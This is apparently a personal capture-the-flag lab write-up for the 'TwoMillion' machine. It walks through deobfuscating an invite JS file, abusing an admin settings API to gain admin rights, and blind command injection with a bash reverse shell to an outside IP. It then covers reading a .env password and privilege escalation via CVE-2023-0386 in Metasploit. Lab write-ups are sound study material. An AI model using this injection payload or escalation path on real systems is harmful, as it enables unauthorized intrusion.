
2026-07-02 10:26

Tags: #labs 

## TwoMillion

- Nmap:
	- ![[Pasted image 20260702102728.png]]
	- 20, 80

- Web:
	- ![[Pasted image 20260702102749.png]]

- Directory fuzzing:
	- ![[Pasted image 20260702102805.png]]


- There's a JS script file in the invite page
	- ![](Pasted%20image%2020260826094157.png)
	- `inviteapi.min.js`
	- `eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))`
	- This code is packed using Dean Edwards' **Packer**, so human cannot read it
	- To **unpack** it
	- Go to the console Dev Tools, paste the packed code, but replace `eval` with `console.log`, you will get the unpacked code
	- ![](Pasted%20image%2020260826100114.png)
	- `function verifyInviteCode(code){var formData={"code":code};$.ajax({type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response){console.log(response)},error:function(response){console.log(response)}})}function makeInviteCode(){$.ajax({type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response){console.log(response)},error:function(response){console.log(response)}})}`

- Try to call the `makeInviteCode` function, but the data is encrypted smh
	- ![](Pasted%20image%2020260826100405.png)
	- ![](Pasted%20image%2020260826100449.png)
	- `data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"`
	- Encrypted with ROT13, so we decrypt it
	- ![](Pasted%20image%2020260826100656.png)
	- `"In order to generate the invite code, make a POST request to /api/v1/invite/generate"`
	- Send a POST request to that endpoint
	- ![](Pasted%20image%2020260826100841.png)
	- UDhFUUMtWVZVNDAtN0JJVjQtVUlCTk4=
	- Base64 100% => Decode: P8EQC-YVU40-7BIV4-UIBNN
	- Use that code to register
	- ![](Pasted%20image%2020260826101033.png)
	- ![](Pasted%20image%2020260826101132.png)
	- Login
	- Only the `Access` path is accessible
	- ![](Pasted%20image%2020260826101313.png)
	- It downloads a vpn file
	- ![](Pasted%20image%2020260826101352.png)
	- Inspect the code, this button leads to /api/v1/user/vpn/generate![](Pasted%20image%2020260826101613.png)
	- Send this request to Burp's Repeater
	- ![](Pasted%20image%2020260826104830.png)
	- Go to /api, get the api version
	- ![](Pasted%20image%2020260826104853.png)
	- Add /v1 to it, it can map this site endpoints
	- ![](Pasted%20image%2020260826104950.png)
	- `"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}`
	- Maybe we can change the admin status with the API admin settings
	- ![](Pasted%20image%2020260827172056.png)
	- Sent a PUT request to that endpoint, it said either 0 or 1
	- ![](Pasted%20image%2020260827172134.png)
	- Looks like we succeeded
	- Go back to the generate VPN of admin API
	- Tryna send a POST but it said invalid content type
	- ![](Pasted%20image%2020260827172327.png)
	- ![](Pasted%20image%2020260827172348.png)
	- json is the answer
	- ![](Pasted%20image%2020260827172435.png)
	- Send it with a username, get a VPN file
	- ![](Pasted%20image%2020260827174018.png)
	- Try normal command injection, did not return anything, also tried some evasive alternatives
	- ![](Pasted%20image%2020260827174100.png)
	- Tried blind command injection, it worked, the response being delayed by 5 secs
	- Tried to call a shell
	- ![](Pasted%20image%2020260827174407.png)
	- owned & bash -c 'bash -i >& /dev/tcp/10.10.14.154/4444 0>&1'
	- ![](Pasted%20image%2020260827174454.png)
	- Success
	- ![](Pasted%20image%2020260827174613.png)
	- Hidden .env file 
	- admin:SuperDuperPass123
	- ![](Pasted%20image%2020260827175044.png)
	- Get their hashes (Fkin bcrypt, dont waste your time)
	- switch to admin user
	- ![](Pasted%20image%2020260827180821.png)
	- Get the flag
	- ![](Pasted%20image%2020260827181415.png)
	- There is a mail sent to this guy at /var/mail/$USER
	- They talked about some CVE of Overlay
	- Do some research, there is CVE-2023-0386
	- It is in msfconsole
	- ![](Pasted%20image%2020260827185053.png)
	- set up a handler
	- Upgrade it to Meterpreter with `session -u 1`
	- ![](Pasted%20image%2020260827185127.png)
	- Exploit


## References:



